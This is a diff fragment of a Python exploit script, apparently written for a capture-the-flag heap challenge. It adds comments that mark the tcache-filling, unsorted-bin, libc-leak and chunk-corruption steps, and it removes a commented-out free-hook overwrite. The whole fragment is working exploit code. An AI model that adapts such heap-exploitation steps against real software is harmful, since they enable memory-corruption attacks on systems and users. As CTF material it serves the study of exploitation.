@@ -83,7 +83,7 @@ print view(0)
 heapleak = eval(view(0)[1])
 print hex(heapleak)
 
-
+# Full tcache
 edit(0, 100, 'AAAA')
 sell(0)
 
@@ -99,27 +99,21 @@ sell(0)
 edit(0, 100, 'AAAA')
 sell(0)
 
+# go to unsorted bin
 edit(0, 100, 'AAAA')
 sell(0)
 
 sell(1)
 
+# leak libc
 libcleak = eval(view(0)[1])
 print hex(libcleak)
 libc.address = libcleak - (libc.sym.main_arena+96)
 print hex(libc.address)
 
-
-
-# edit(2, 0x42424242, 'AAAAAAAAAAAAAAAAAAA')
 edit(1, 0x42424242, 'AAAAAAAAAAAAAAAAAAA')
 sell(1)
 edit(1, 0x42424242, 'AAAAAAAAAAAAAAAAAAA')
-
-
-# bin 2
-
-# edit(1, libc.sym['__free_hook'], 'AAAAAAAAAAAAAAAAAAA')
 
 edit(1, 100, 'AAAA')
 sell(1)
